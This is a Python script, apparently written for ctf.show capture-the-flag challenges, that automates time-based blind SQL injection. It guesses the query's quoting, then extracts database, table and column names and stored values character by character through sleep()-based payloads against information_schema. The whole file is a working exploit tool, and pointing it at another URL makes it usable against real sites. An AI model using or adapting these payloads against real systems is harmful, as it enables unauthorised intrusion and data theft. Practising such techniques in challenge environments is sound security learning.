import requests
from lxml import etree
import time




# '''
# guess sql 格式
# '''
# def GuessSql(url):
#     GuessList

'''
爆破database
'''
def boolean_sql_database(url,delay,strloc,limit):

    baseurl = url
    asciiValue=0
    eqlualurl=' or if((select ascii(substr(schema_name,{strloc},1)) from information_schema.schemata limit {limit},1) = {asciiValue},sleep({delay}),0) %23'
    for i in range(33,128):
        print(i,end=', ')
        real_url=baseurl+eqlualurl.format(delay=delay,asciiValue=i,strloc=strloc,limit=limit)
        # print(real_url)
        StartTime=time.time()
        response=requests.get(url=real_url)
        EndTime=time.time()
        if((EndTime-StartTime)>delay):
            return chr(i)




'''
爆破table
'''
def boolean_sql_table(url,delay,databaseName,strloc,limit):
    baseurl = url
    asciiValue=0
    eqlualurl=" or if((select ascii(substr(table_name,{strloc},1)) from information_schema.tables where table_schema='{databaseName}' limit {limit},1)={asciiValue},sleep({delay}),0) %23"
    for i in range(33,128):
        print(i,end=', ')
        real_url=baseurl+eqlualurl.format(databaseName=databaseName,delay=delay,asciiValue=i,strloc=strloc,limit=limit)
        # print(real_url)
        StartTime=time.time()
        response=requests.get(url=real_url)
        EndTime=time.time()
        if((EndTime-StartTime)>delay):
            return chr(i)



'''
爆破column
'''
def boolean_sql_column(url,delay,databaseName,tableName,strloc,limit):

    baseurl = url
    asciiValue=0
    eqlualurl=" or if((select ascii(substr(column_name,{strloc},1)) from information_schema.columns where table_schema= '{databaseName}' and table_name= '{tableName}' limit {limit},1) = {asciiValue},sleep({delay}),0) %23"
    for i in range(33,128):
        print(i,end=', ')
        real_url=baseurl+eqlualurl.format(databaseName=databaseName,tableName=tableName,delay=delay,asciiValue=i,strloc=strloc,limit=limit)
        # print(real_url)
        StartTime=time.time()
        response=requests.get(url=real_url)
        EndTime=time.time()
        if((EndTime-StartTime)>delay):
            return chr(i)


'''
爆破value
'''
def boolean_sql_value(url,delay,databaseName,tableName,columnName,strloc,limit):
    baseurl = url
    asciiValue=0
    eqlualurl=" or if((select ascii(substr({columnName},{strloc},1)) from {databaseName}.{tableName} limit {limit},1) = {asciiValue},sleep({delay}),0) %23"
    for i in range(33,128):
        print(i,end=', ')
        real_url=baseurl+eqlualurl.format(databaseName=databaseName,tableName=tableName,columnName=columnName,delay=delay,asciiValue=i,strloc=strloc,limit=limit)
        # print(real_url)
        StartTime=time.time()
        response=requests.get(url=real_url)
        EndTime=time.time()
        if((EndTime-StartTime)>delay):
            return chr(i)




if __name__ =="__main__":
    #guessurl
    baseurl="http://6b038278-6fa5-4b03-8a0a-5c52521c857d.challenge.ctf.show:8080/?id=-1"
    #爆破url
    url='http://383d4f68-c627-4465-b810-2db8ce32a337.challenge.ctf.show:8080/?id=-1"'
    #记录的最多数量
    numbermax=6
    #字符的最大长度
    lengthmax=50
    typeList = ['guess','database', 'table', 'column', 'value']
    type = typeList[4]
    #猜测sql语句的格式
    GuessList=["","'",'"',')',"')",'")',"'))",'"))']
    #延时时间
    delay=0.5
    #数据库名称
    databaseName="ctfshow"
    #表名称
    tableName="flagugs"
    #字段名称
    columnName="flag43s"

    if(type=="guess"):
        for guess in GuessList:
            url=baseurl+guess+' or if((select ascii(substr(schema_name,1,1)) from information_schema.schemata limit 0,1) >1 ,sleep({delay}),0) %23'.format(delay=delay)
            S=time.time()
            response=requests.get(url=url)
            E=time.time()
            if((E-S)>delay):
                url=baseurl+guess
                print(f"guess成功:{guess}")
                print(url)
                exit(0)
            else:
                continue


    #自动操作无需修改
    for limit in range(0,numbermax):
        result = []
        for i in range(1,lengthmax):
            if(type=="database"):
                a=boolean_sql_database(url,delay,i,limit)
            elif(type=="table"):
                a=boolean_sql_table(url,delay,databaseName,i,limit)
                # a=boolean_sql_column(url,"are","ctftraining","FLAG_TABLE",i,limit)
            elif(type=="column"):
                a=boolean_sql_column(url,delay,databaseName,tableName,i,limit)
            elif(type=="value"):
                a=boolean_sql_value(url,delay,databaseName,tableName,columnName,i,limit)
            else:
                print("gkd,重开吧")
            try:
                if(ord(a)!=0 and a!=None):
                    result.append(a)
                else:
                    break
            except:
                break
        print(result)
        r=''.join(result)
        if(r==''):
            print('\n\n查询结束')
            break
        else:
            print(r)
    print(r)

